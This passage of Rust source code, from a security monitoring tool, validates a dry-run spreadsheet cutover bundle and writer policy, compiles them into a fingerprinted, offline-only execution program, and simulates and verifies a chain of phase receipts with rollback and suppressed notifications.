// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

use serde::{Deserialize, Serialize};
use serde_json::{Map, Value};
use sha2::{Digest, Sha256};
use std::collections::{BTreeMap, BTreeSet};
use std::fmt;

const PROGRAM_VERSION: &str = "security_intelligence_monitor_execution_program_v1";
const RECEIPT_VERSION: &str = "security_intelligence_monitor_execution_receipt_v1";
const BUNDLE_VERSION: &str = "security_intelligence_monitor_cutover_bundle_v1";
const POLICY_VERSION: &str = "security_intelligence_monitor_writer_policy_v1";
const SCHEMA_VERSION: u64 = 7;
const FINGERPRINT_ALGORITHM: &str = "sha256-canonical-json-v1";
const MAX_POLICY_RECIPIENTS: usize = 32;
const MAX_POLICY_OPERATIONS: usize = 30_000;
const MAX_POLICY_ID_LENGTH: usize = 128;
const MAX_SPREADSHEET_ID_LENGTH: usize = 200;
const MAX_TENANT_ID_LENGTH: usize = 253;
const HUMAN_FIELDS: &[&str] = &[
    "assignee",
    "comment",
    "decision",
    "disposition",
    "email",
    "emailDisposition",
    "emailSentAt",
    "emailStatus",
    "links",
    "notes",
    "notificationStatus",
    "owner",
    "reviewedBy",
    "status",
];
const ALLOWED_URLS: &[&str] = &[
    "https://admin.google.com/ac/security",
    "https://entra.microsoft.com/",
    "https://security.microsoft.com/",
];
const PHASE_NAMES: &[&str] = &[
    "admit_preflight",
    "backup_snapshot_pinning",
    "additive_schema_migration",
    "findings_writes",
    "investigations_writes",
    "recommendations_writes",
    "exact_readback",
    "commit_or_rollback",
    "notification_handoff",
];
const FAILURE_PHASE_NAMES: &[&str] = &[
    "admit_preflight",
    "backup_snapshot_pinning",
    "additive_schema_migration",
    "findings_writes",
    "investigations_writes",
    "recommendations_writes",
    "exact_readback",
    "commit_or_rollback",
    "notification_handoff",
    "rollback",
];

#[derive(Debug, Clone, PartialEq, Eq)]
pub(super) struct ProgramError(String);

impl ProgramError {
    fn invalid(message: impl Into<String>) -> Self {
        Self(message.into())
    }
}

impl fmt::Display for ProgramError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(&self.0)
    }
}

impl std::error::Error for ProgramError {}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundleInput {
    bundle_version: String,
    mode: String,
    status: String,
    external_writes_allowed: bool,
    email_allowed: bool,
    fingerprints: BundleFingerprints,
    preconditions: BundlePreconditions,
    migration: BundleMigration,
    sheets: BundleSheets,
    readback: BundleReadback,
    rollback: BundleRollback,
    no_effect: BundleNoEffect,
    notification: BundleNotification,
    notifier: BundleNotification,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundleFingerprints {
    algorithm: String,
    input: String,
    target: String,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundlePreconditions {
    mode: BundleModePrecondition,
    coverage: BundleCoveragePrecondition,
    schema: BundleSchemaPrecondition,
    snapshot: Option<BundleSnapshotPrecondition>,
    authorization_required: bool,
    external_writes_allowed: bool,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundleModePrecondition {
    expected: String,
    observed: String,
    satisfied: bool,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundleCoveragePrecondition {
    coverage_complete: bool,
    required_coverage_complete: bool,
    fail_closed: bool,
    satisfied: bool,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundleSchemaPrecondition {
    expected: u64,
    observed: u64,
    compatible: bool,
    satisfied: bool,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundleSnapshotPrecondition {
    revision: Option<String>,
    etag: Option<String>,
    expected_state_fingerprint: Option<String>,
    observed_state_fingerprint: String,
    satisfied: bool,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundleMigration {
    from_version: u64,
    to_version: u64,
    mode: String,
    external_writes_allowed: bool,
    additions: Vec<BundleAddition>,
    preserved_existing_fields: Vec<String>,
    invariants: Vec<String>,
    forbidden_operations: Vec<String>,
}

#[derive(Clone, Debug, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
struct BundleAddition {
    tab: String,
    field: String,
    reason: String,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundleSheets {
    external_writes_allowed: bool,
    tab_order: Vec<String>,
    operation_order: Vec<String>,
    tabs: Vec<BundleTab>,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundleTab {
    name: String,
    key_field: String,
    range: String,
    lookup_range: String,
    operations: Vec<BundleOperation>,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundleOperation {
    action: String,
    key: String,
    eligible: bool,
    reason: String,
    lookup: BundleLookup,
    record: BTreeMap<String, Value>,
    patch: BTreeMap<String, Value>,
    preserved_human_fields: BTreeMap<String, Value>,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundleLookup {
    range: String,
    key_field: String,
    key: String,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundleReadback {
    executed: bool,
    success: bool,
    assertions: Vec<BundleAssertion>,
    on_failure: String,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundleAssertion {
    tab: String,
    range: String,
    key_field: String,
    key: String,
    action: String,
    expected_machine_record: BTreeMap<String, Value>,
    preserved_human_fields: Vec<String>,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundleRollback {
    strategy: String,
    external_writes_performed: bool,
    target_fingerprint: String,
    target_revision: Option<String>,
    steps: Vec<String>,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundleNoEffect {
    sheets_writes_performed: bool,
    email_sent: bool,
    credentials_changed: bool,
    target_mutated: bool,
    local_bundle_only: bool,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
struct BundleNotification {
    action: String,
    effective: String,
    eligible: bool,
    recipient_policy: String,
    recipients: Vec<String>,
    requires_readback_success: bool,
    authorization_required: bool,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct WriterPolicy {
    policy_version: String,
    policy_id: String,
    tenant_id: String,
    spreadsheet_id: String,
    schema_version: u64,
    recipient_policy: RecipientPolicy,
    limits: PolicyLimits,
}

#[derive(Clone, Debug, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct RecipientPolicy {
    mode: String,
    to: Vec<String>,
    bcc: Vec<String>,
}

#[derive(Clone, Debug, Deserialize, Serialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct PolicyLimits {
    max_rows_per_tab: usize,
    max_cells_per_tab: usize,
    max_operations: usize,
}

#[derive(Clone, Debug)]
struct TargetPin {
    tenant_id: String,
    spreadsheet_id: String,
    schema_version: u64,
    state_fingerprint: String,
    revision: Option<String>,
    etag: Option<String>,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct ExecutionProgram {
    program_version: String,
    mode: String,
    bundle_version: String,
    bundle_fingerprint: String,
    policy_fingerprint: String,
    policy_id: String,
    policy_limits: PolicyLimits,
    target: ProgramTargetPin,
    external_writes_allowed: bool,
    live_apply_available: bool,
    human_authorization_required: bool,
    notification: ProgramNotification,
    phases: Vec<ProgramPhase>,
    #[serde(skip_serializing_if = "Option::is_none")]
    program_fingerprint: Option<String>,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct ProgramTargetPin {
    tenant_id: String,
    spreadsheet_id: String,
    schema_version: u64,
    state_fingerprint: String,
    revision: Option<String>,
    etag: Option<String>,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct ProgramNotification {
    recipient_policy: String,
    to: Vec<String>,
    bcc: Vec<String>,
    effective: String,
    requires_readback_success: bool,
    human_authorization_required: bool,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct ProgramPhase {
    sequence: u8,
    name: String,
    requires_receipt_from: Option<String>,
    request: PhaseRequest,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(
    tag = "requestType",
    rename_all = "snake_case",
    rename_all_fields = "camelCase"
)]
enum PhaseRequest {
    AdmitPreflight {
        expected_bundle_fingerprint: String,
        expected_policy_fingerprint: String,
        expected_target_fingerprint: String,
        tenant_id: String,
        spreadsheet_id: String,
        expected_schema_version: u64,
        human_authorization_required: bool,
        external_writes_allowed: bool,
    },
    BackupSnapshotPinning {
        snapshot_fingerprint: String,
        expected_revision: Option<String>,
        expected_etag: Option<String>,
        backup_required_before_writes: bool,
        restore_instructions: Vec<String>,
        external_writes_allowed: bool,
    },
    AdditiveSchemaMigration {
        from_version: u64,
        to_version: u64,
        additions: Vec<BundleAddition>,
        preserved_existing_fields: Vec<String>,
        forbidden_operations: Vec<String>,
        external_writes_allowed: bool,
    },
    SheetWrites {
        tab: String,
        range: String,
        key_field: String,
        expected_target_fingerprint: String,
        expected_revision: Option<String>,
        external_writes_allowed: bool,
        operations: Vec<WriteRequest>,
    },
    ExactReadback {
        expected_target_fingerprint: String,
        expected_revision: Option<String>,
        assertions: Vec<ReadbackRequest>,
        notification_requires_success: bool,
    },
    CommitOrRollback {
        on_success: String,
        on_failure: String,
        restore_instructions: Vec<String>,
        notification_effective: String,
    },
    NotificationHandoff {
        recipient_policy: String,
        to: Vec<String>,
        bcc: Vec<String>,
        effective: String,
        requires_readback_success: bool,
        human_authorization_required: bool,
        external_writes_allowed: bool,
    },
}

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct WriteRequest {
    action: String,
    key: String,
    eligible: bool,
    range: String,
    key_field: String,
    reason: String,
    record: BTreeMap<String, Value>,
    patch: BTreeMap<String, Value>,
    preserved_human_fields: BTreeMap<String, Value>,
    expected_target_fingerprint: String,
    expected_revision: Option<String>,
    external_write_performed: bool,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct ReadbackRequest {
    tab: String,
    range: String,
    key_field: String,
    key: String,
    action: String,
    expected_machine_record: BTreeMap<String, Value>,
    preserved_human_fields: Vec<String>,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct SimulationArtifact {
    simulation_version: String,
    mode: String,
    program_fingerprint: String,
    status: String,
    final_state: String,
    external_writes_allowed: bool,
    live_apply_available: bool,
    notification_effective: String,
    notification_sent: bool,
    receipts: Vec<PhaseReceipt>,
    transitions: Vec<StateTransition>,
    invariants: SimulationInvariants,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct PhaseReceipt {
    receipt_version: String,
    sequence: u64,
    phase: String,
    status: String,
    program_fingerprint: String,
    previous_receipt_fingerprint: Option<String>,
    external_writes_performed: bool,
    write_intents_applied: bool,
    notification_effective: String,
    readback_assertions_succeeded: bool,
    state_before: String,
    state_after: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    receipt_fingerprint: Option<String>,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct StateTransition {
    sequence: u64,
    from: String,
    to: String,
    receipt_phase: String,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct SimulationInvariants {
    no_write_before_admission_and_backup: bool,
    no_next_phase_before_prior_receipt_succeeds: bool,
    failure_routes_to_rollback: bool,
    notification_only_after_successful_readback: bool,
    notification_permanently_suppressed: bool,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct ReplayResult {
    action: String,
    reason: String,
    program_fingerprint: String,
    external_writes_allowed: bool,
    live_apply_available: bool,
    notification_effective: String,
}

pub(super) fn failure_phase_names() -> &'static [&'static str] {
    FAILURE_PHASE_NAMES
}

pub(super) fn compile_execution_program(
    bundle_value: &Value,
    target_value: &Value,
    policy_value: &Value,
) -> Result<Value, ProgramError> {
    let bundle: BundleInput = serde_json::from_value(bundle_value.clone())
        .map_err(|_| ProgramError::invalid("invalid T3b cutover bundle shape"))?;
    let policy: WriterPolicy = serde_json::from_value(policy_value.clone())
        .map_err(|_| ProgramError::invalid("invalid writer policy shape"))?;
    validate_policy(&policy)?;
    let target = validate_target(target_value, &policy)?;
    validate_bundle(&bundle, &policy, &target, target_value)?;
    validate_operations(&bundle.sheets, &bundle.readback, &policy, &target)?;

    let bundle_fingerprint = fingerprint_value(bundle_value);
    let policy_fingerprint = fingerprint_value(policy_value);
    let phases = build_phases(
        &bundle,
        &policy,
        &target,
        &bundle_fingerprint,
        &policy_fingerprint,
    );
    let mut program = ExecutionProgram {
        program_version: PROGRAM_VERSION.to_string(),
        mode: "offline-simulation".to_string(),
        bundle_version: BUNDLE_VERSION.to_string(),
        bundle_fingerprint,
        policy_fingerprint,
        policy_id: policy.policy_id.clone(),
        policy_limits: policy.limits.clone(),
        target: ProgramTargetPin {
            tenant_id: target.tenant_id.clone(),
            spreadsheet_id: target.spreadsheet_id.clone(),
            schema_version: target.schema_version,
            state_fingerprint: target.state_fingerprint.clone(),
            revision: target.revision.clone(),
            etag: target.etag.clone(),
        },
        external_writes_allowed: false,
        live_apply_available: false,
        human_authorization_required: true,
        notification: ProgramNotification {
            recipient_policy: policy.recipient_policy.mode.clone(),
            to: policy.recipient_policy.to.clone(),
            bcc: policy.recipient_policy.bcc.clone(),
            effective: "suppress".to_string(),
            requires_readback_success: true,
            human_authorization_required: true,
        },
        phases,
        program_fingerprint: None,
    };
    program.program_fingerprint = Some(program_fingerprint(&program)?);
    serde_json::to_value(program)
        .map_err(|_| ProgramError::invalid("could not serialize execution program"))
}

pub(super) fn simulate_execution_program(
    program_value: &Value,
    failure_phase: Option<&str>,
) -> Result<Value, ProgramError> {
    let program: ExecutionProgram = serde_json::from_value(program_value.clone())
        .map_err(|_| ProgramError::invalid("invalid execution program shape"))?;
    validate_program(&program)?;
    if let Some(phase) = failure_phase {
        if !FAILURE_PHASE_NAMES.contains(&phase) {
            return Err(ProgramError::invalid("unknown simulation failure phase"));
        }
    }

    let program_fingerprint = program
        .program_fingerprint
        .clone()
        .ok_or_else(|| ProgramError::invalid("execution program is missing fingerprint"))?;
    let mut receipts = Vec::new();
    let mut transitions = Vec::new();
    let mut current_state = "initial".to_string();
    let mut failure_observed = false;
    let mut rollback_success = true;

    for phase in &program.phases {
        let force_rollback_failure = failure_phase == Some("rollback");
        if failure_phase == Some(phase.name.as_str())
            || (force_rollback_failure && phase.name == "commit_or_rollback")
        {
            failure_observed = true;
            let next_state = format!("{}_failed", phase.name);
            push_receipt(
                &mut receipts,
                &mut transitions,
                ReceiptEvent {
                    program_fingerprint: &program_fingerprint,
                    phase: &phase.name,
                    status: "failed",
                    state_before: &current_state,
                    state_after: &next_state,
                    readback_assertions_succeeded: false,
                },
            )?;
            current_state = next_state;
            rollback_success = !force_rollback_failure;
            break;
        }

        let next_state = phase_success_state(&phase.name);
        let status = if phase.name == "notification_handoff" {
            "suppressed"
        } else {
            "succeeded"
        };
        let readback_ok = phase.name == "exact_readback";
        push_receipt(
            &mut receipts,
            &mut transitions,
            ReceiptEvent {
                program_fingerprint: &program_fingerprint,
                phase: &phase.name,
                status,
                state_before: &current_state,
                state_after: &next_state,
                readback_assertions_succeeded: readback_ok,
            },
        )?;
        current_state = next_state;
    }

    if failure_observed {
        if failure_phase == Some("rollback") {
            rollback_success = false;
        }
        let rollback_state = if rollback_success {
            "rolled_back"
        } else {
            "rollback_failed"
        };
        push_receipt(
            &mut receipts,
            &mut transitions,
            ReceiptEvent {
                program_fingerprint: &program_fingerprint,
                phase: "rollback",
                status: if rollback_success {
                    "succeeded"
                } else {
                    "failed"
                },
                state_before: &current_state,
                state_after: rollback_state,
                readback_assertions_succeeded: false,
            },
        )?;
        current_state = rollback_state.to_string();
    }

    let status = if !failure_observed {
        "completed"
    } else if rollback_success {
        "rolled_back"
    } else {
        "blocked_rollback_failure"
    };
    let simulation = SimulationArtifact {
        simulation_version: RECEIPT_VERSION.to_string(),
        mode: "local-receipt-simulation".to_string(),
        program_fingerprint,
        status: status.to_string(),
        final_state: current_state,
        external_writes_allowed: false,
        live_apply_available: false,
        notification_effective: "suppress".to_string(),
        notification_sent: false,
        invariants: SimulationInvariants {
            no_write_before_admission_and_backup: no_write_before_admission_and_backup(&receipts),
            no_next_phase_before_prior_receipt_succeeds: receipts_are_sequential(&receipts)
                && receipts_follow_success(&receipts),
            failure_routes_to_rollback: !failure_observed
                || receipts.last().map(|receipt| receipt.phase.as_str()) == Some("rollback"),
            notification_only_after_successful_readback: if failure_observed {
                receipts
                    .iter()
                    .find(|receipt| receipt.phase == "notification_handoff")
                    .is_none_or(|receipt| {
                        receipt.status == "failed" && readback_precedes_notification(&receipts)
                    })
            } else {
                readback_precedes_notification(&receipts)
            },
            notification_permanently_suppressed: true,
        },
        receipts,
        transitions,
    };
    let value = serde_json::to_value(simulation)
        .map_err(|_| ProgramError::invalid("could not serialize simulation"))?;
    verify_execution_receipts(program_value, &value)?;
    Ok(value)
}

pub(super) fn verify_execution_receipts(
    program_value: &Value,
    simulation_value: &Value,
) -> Result<(), ProgramError> {
    let program: ExecutionProgram = serde_json::from_value(program_value.clone())
        .map_err(|_| ProgramError::invalid("invalid execution program shape"))?;
    validate_program(&program)?;
    let simulation: SimulationArtifact = serde_json::from_value(simulation_value.clone())
        .map_err(|_| ProgramError::invalid("invalid simulation receipt shape"))?;
    let program_fingerprint = program
        .program_fingerprint
        .as_deref()
        .ok_or_else(|| ProgramError::invalid("execution program is missing fingerprint"))?;
    if simulation.program_fingerprint != program_fingerprint {
        return Err(ProgramError::invalid(
            "receipt program fingerprint mismatch",
        ));
    }
    if simulation.external_writes_allowed
        || simulation.live_apply_available
        || simulation.notification_effective != "suppress"
        || simulation.notification_sent
    {
        return Err(ProgramError::invalid(
            "simulation violates no-effect boundary",
        ));
    }

    let mut previous_fingerprint = None;
    let mut expected_program_index = 0usize;
    let mut saw_failure = false;
    for (index, receipt) in simulation.receipts.iter().enumerate() {
        if receipt.sequence != (index + 1) as u64 {
            return Err(ProgramError::invalid("receipt sequence is out of order"));
        }
        if receipt.receipt_version != RECEIPT_VERSION {
            return Err(ProgramError::invalid("unsupported receipt version"));
        }
        if receipt.program_fingerprint != program_fingerprint {
            return Err(ProgramError::invalid(
                "receipt program fingerprint mismatch",
            ));
        }
        if receipt.previous_receipt_fingerprint != previous_fingerprint {
            return Err(ProgramError::invalid(
                "forged or out-of-order receipt chain",
            ));
        }
        if receipt.external_writes_performed
            || receipt.write_intents_applied
            || receipt.notification_effective != "suppress"
        {
            return Err(ProgramError::invalid("receipt claims an external effect"));
        }
        let expected_receipt_fingerprint = receipt_fingerprint(receipt)?;
        if receipt.receipt_fingerprint.as_deref() != Some(expected_receipt_fingerprint.as_str()) {
            return Err(ProgramError::invalid("forged receipt fingerprint"));
        }
        if receipt.phase == "rollback" {
            if !saw_failure || index + 1 != simulation.receipts.len() {
                return Err(ProgramError::invalid("rollback receipt is out of order"));
            }
        } else {
            if expected_program_index >= program.phases.len()
                || receipt.phase != program.phases[expected_program_index].name
            {
                return Err(ProgramError::invalid("phase receipt is out of order"));
            }
            if receipt.status == "failed" {
                saw_failure = true;
                if index + 2 != simulation.receipts.len() {
                    return Err(ProgramError::invalid(
                        "failed phase has an unexpected successor",
                    ));
                }
            } else if saw_failure {
                return Err(ProgramError::invalid("phase continued after failure"));
            }
            if receipt.phase == "notification_handoff" {
                if !readback_precedes_notification(&simulation.receipts) {
                    return Err(ProgramError::invalid(
                        "notification handoff occurred before successful readback",
                    ));
                }
                if receipt.status != "suppressed" && receipt.status != "failed" {
                    return Err(ProgramError::invalid("notification is not suppressed"));
                }
            }
            expected_program_index += 1;
        }
        previous_fingerprint = receipt.receipt_fingerprint.clone();
    }
    if !saw_failure && expected_program_index != program.phases.len() {
        return Err(ProgramError::invalid(
            "simulation is missing phase receipts",
        ));
    }
    if saw_failure && simulation.status == "completed" {
        return Err(ProgramError::invalid("failed simulation claims completion"));
    }
    if !saw_failure && simulation.status != "completed" {
        return Err(ProgramError::invalid(
            "successful simulation has invalid status",
        ));
    }
    if !simulation.invariants.no_write_before_admission_and_backup
        || !simulation
            .invariants
            .no_next_phase_before_prior_receipt_succeeds
        || !simulation.invariants.failure_routes_to_rollback
        || !simulation
            .invariants
            .notification_only_after_successful_readback
        || !simulation.invariants.notification_permanently_suppressed
    {
        return Err(ProgramError::invalid("simulation invariant failed"));
    }
    Ok(())
}

pub(crate) fn replay_execution_program(
    program_value: &Value,
    previous_simulation_value: &Value,
) -> Result<Value, ProgramError> {
    let program: ExecutionProgram = serde_json::from_value(program_value.clone())
        .map_err(|_| ProgramError::invalid("invalid execution program shape"))?;
    validate_program(&program)?;
    verify_execution_receipts(program_value, previous_simulation_value)?;
    let simulation: SimulationArtifact = serde_json::from_value(previous_simulation_value.clone())
        .map_err(|_| ProgramError::invalid("invalid simulation receipt shape"))?;
    let program_fingerprint = program
        .program_fingerprint
        .clone()
        .ok_or_else(|| ProgramError::invalid("execution program is missing fingerprint"))?;
    if simulation.status != "completed" {
        return Err(ProgramError::invalid(
            "ambiguous replay requires a completed simulation",
        ));
    }
    serde_json::to_value(ReplayResult {
        action: "noop".to_string(),
        reason: "exact_completed_replay".to_string(),
        program_fingerprint,
        external_writes_allowed: false,
        live_apply_available: false,
        notification_effective: "suppress".to_string(),
    })
    .map_err(|_| ProgramError::invalid("could not serialize replay result"))
}

fn validate_policy(policy: &WriterPolicy) -> Result<(), ProgramError> {
    if policy.policy_version != POLICY_VERSION {
        return Err(ProgramError::invalid("unsupported writer policy version"));
    }
    validate_safe_token(&policy.policy_id, "policyId", MAX_POLICY_ID_LENGTH)?;
    validate_tenant_id(&policy.tenant_id)?;
    validate_spreadsheet_id(&policy.spreadsheet_id)?;
    if policy.schema_version != SCHEMA_VERSION {
        return Err(ProgramError::invalid(
            "writer policy schema version mismatch",
        ));
    }
    if policy.recipient_policy.mode != "fixed" {
        return Err(ProgramError::invalid("recipient policy must be fixed"));
    }
    if policy.recipient_policy.to.is_empty() || policy.recipient_policy.bcc.is_empty() {
        return Err(ProgramError::invalid(
            "recipient policy To/Bcc roles cannot be empty",
        ));
    }
    let recipient_count = policy.recipient_policy.to.len() + policy.recipient_policy.bcc.len();
    if recipient_count > MAX_POLICY_RECIPIENTS {
        return Err(ProgramError::invalid(
            "recipient policy exceeds recipient limit",
        ));
    }
    let mut recipients = BTreeSet::new();
    for recipient in policy
        .recipient_policy
        .to
        .iter()
        .chain(policy.recipient_policy.bcc.iter())
    {
        validate_recipient(recipient)?;
        if !recipients.insert(recipient.as_str()) {
            return Err(ProgramError::invalid(
                "duplicate notification recipient across roles",
            ));
        }
    }
    validate_policy_limits(&policy.limits)?;
    Ok(())
}

fn validate_policy_limits(limits: &PolicyLimits) -> Result<(), ProgramError> {
    if limits.max_rows_per_tab == 0 || limits.max_rows_per_tab > 10_000 {
        return Err(ProgramError::invalid("invalid maxRowsPerTab limit"));
    }
    if limits.max_cells_per_tab == 0 || limits.max_cells_per_tab > 300_000 {
        return Err(ProgramError::invalid("invalid maxCellsPerTab limit"));
    }
    if limits.max_operations == 0 || limits.max_operations > MAX_POLICY_OPERATIONS {
        return Err(ProgramError::invalid("invalid maxOperations limit"));
    }
    Ok(())
}

fn validate_target(target: &Value, policy: &WriterPolicy) -> Result<TargetPin, ProgramError> {
    let object = target
        .as_object()
        .ok_or_else(|| ProgramError::invalid("target snapshot must be an object"))?;
    let schema_version = object
        .get("schemaVersion")
        .and_then(Value::as_u64)
        .ok_or_else(|| ProgramError::invalid("target snapshot is missing schemaVersion"))?;
    if schema_version != policy.schema_version {
        return Err(ProgramError::invalid("target and policy schema mismatch"));
    }
    for collection in ["findings", "investigations", "recommendations"] {
        if !object.get(collection).is_some_and(Value::is_array) {
            return Err(ProgramError::invalid(format!(
                "target snapshot is missing {collection}"
            )));
        }
    }
    if let Some(tenant_id) = object.get("tenantId").and_then(Value::as_str) {
        if tenant_id != policy.tenant_id {
            return Err(ProgramError::invalid(
                "target tenant identity mismatches policy",
            ));
        }
    }
    if let Some(spreadsheet_id) = object.get("spreadsheetId").and_then(Value::as_str) {
        if spreadsheet_id != policy.spreadsheet_id {
            return Err(ProgramError::invalid(
                "target spreadsheet identity mismatches policy",
            ));
        }
    }
    let snapshot = match object.get("snapshot") {
        Some(Value::Object(snapshot)) => Some(snapshot),
        Some(_) => {
            return Err(ProgramError::invalid(
                "target snapshot backup metadata must be an object",
            ));
        }
        None => None,
    };
    let state_fingerprint = target_state_fingerprint(target)?;
    let snapshot_fingerprint = optional_target_text(
        object,
        snapshot,
        &[
            "stateFingerprint",
            "stateHash",
            "snapshotHash",
            "hash",
            "fingerprint",
        ],
        "target snapshot fingerprint",
    )?
    .ok_or_else(|| ProgramError::invalid("target backup is missing state fingerprint"))?;
    validate_fingerprint("target snapshot fingerprint", &snapshot_fingerprint)?;
    if snapshot_fingerprint != state_fingerprint {
        return Err(ProgramError::invalid("target backup fingerprint mismatch"));
    }
    let revision = optional_target_text(object, snapshot, &["revision"], "snapshot revision")?;
    let etag = optional_target_text(object, snapshot, &["etag"], "snapshot etag")?;
    if revision.is_none() && etag.is_none() {
        return Err(ProgramError::invalid(
            "target backup must include revision or etag",
        ));
    }
    Ok(TargetPin {
        tenant_id: policy.tenant_id.clone(),
        spreadsheet_id: policy.spreadsheet_id.clone(),
        schema_version,
        state_fingerprint,
        revision,
        etag,
    })
}

fn validate_bundle(
    bundle: &BundleInput,
    policy: &WriterPolicy,
    target: &TargetPin,
    target_value: &Value,
) -> Result<(), ProgramError> {
    if bundle.bundle_version != BUNDLE_VERSION {
        return Err(ProgramError::invalid("unsupported T3b bundle version"));
    }
    if bundle.mode != "dry-run" || bundle.status != "eligible_pending_authorization" {
        return Err(ProgramError::invalid(
            "bundle is not eligible for program admission",
        ));
    }
    if bundle.external_writes_allowed || bundle.email_allowed {
        return Err(ProgramError::invalid(
            "bundle violates external no-effect boundary",
        ));
    }
    if bundle.fingerprints.algorithm != FINGERPRINT_ALGORITHM {
        return Err(ProgramError::invalid(
            "unsupported bundle fingerprint algorithm",
        ));
    }
    validate_fingerprint("bundle input fingerprint", &bundle.fingerprints.input)?;
    validate_fingerprint("bundle target fingerprint", &bundle.fingerprints.target)?;
    if bundle.fingerprints.target != target.state_fingerprint {
        return Err(ProgramError::invalid(
            "bundle and target fingerprints mismatch",
        ));
    }
    if bundle.preconditions.mode.expected != "read-only"
        || bundle.preconditions.mode.observed != "read-only"
        || !bundle.preconditions.mode.satisfied
        || !bundle.preconditions.coverage.coverage_complete
        || !bundle.preconditions.coverage.required_coverage_complete
        || bundle.preconditions.coverage.fail_closed
        || !bundle.preconditions.coverage.satisfied
        || bundle.preconditions.schema.expected != SCHEMA_VERSION
        || bundle.preconditions.schema.observed != SCHEMA_VERSION
        || !bundle.preconditions.schema.compatible
        || !bundle.preconditions.schema.satisfied
        || !bundle.preconditions.authorization_required
        || bundle.preconditions.external_writes_allowed
    {
        return Err(ProgramError::invalid(
            "bundle preflight gate is not satisfied",
        ));
    }
    let snapshot = bundle
        .preconditions
        .snapshot
        .as_ref()
        .ok_or_else(|| ProgramError::invalid("bundle backup precondition is missing"))?;
    if !snapshot.satisfied || snapshot.observed_state_fingerprint != target.state_fingerprint {
        return Err(ProgramError::invalid(
            "bundle snapshot precondition mismatch",
        ));
    }
    if let Some(expected) = &snapshot.expected_state_fingerprint {
        if expected != &target.state_fingerprint {
            return Err(ProgramError::invalid(
                "bundle expected target fingerprint mismatch",
            ));
        }
    }
    if snapshot.revision != target.revision || snapshot.etag != target.etag {
        return Err(ProgramError::invalid("bundle revision or etag mismatch"));
    }
    if bundle.migration.from_version != 6
        || bundle.migration.to_version != SCHEMA_VERSION
        || bundle.migration.mode != "additive_only"
        || bundle.migration.external_writes_allowed
        || !contains_all_strings(
            &bundle.migration.forbidden_operations,
            &[
                "delete_columns",
                "delete_cells",
                "delete_rows",
                "reinterpret_existing_columns",
                "overwrite_human_fields",
            ],
        )
        || !bundle
            .migration
            .invariants
            .iter()
            .any(|item| item == "human_fields_are_preserved")
    {
        return Err(ProgramError::invalid(
            "bundle additive migration contract is incomplete",
        ));
    }
    if !bundle.sheets.external_writes_allowed
        && !bundle.readback.executed
        && !bundle.readback.success
        && !bundle.rollback.external_writes_performed
        && !bundle.no_effect.sheets_writes_performed
        && !bundle.no_effect.email_sent
        && !bundle.no_effect.credentials_changed
        && !bundle.no_effect.target_mutated
        && bundle.no_effect.local_bundle_only
    {
        // This branch is intentionally empty: all no-effect assertions are checked below.
    } else {
        return Err(ProgramError::invalid("bundle no-effect manifest is unsafe"));
    }
    if bundle.rollback.strategy != "retain_target_snapshot_and_discard_local_bundle"
        || bundle.rollback.target_fingerprint != target.state_fingerprint
        || bundle.rollback.target_revision != target.revision
        || bundle.rollback.steps.is_empty()
    {
        return Err(ProgramError::invalid(
            "bundle rollback manifest is incomplete",
        ));
    }
    validate_notification(&bundle.notification)?;
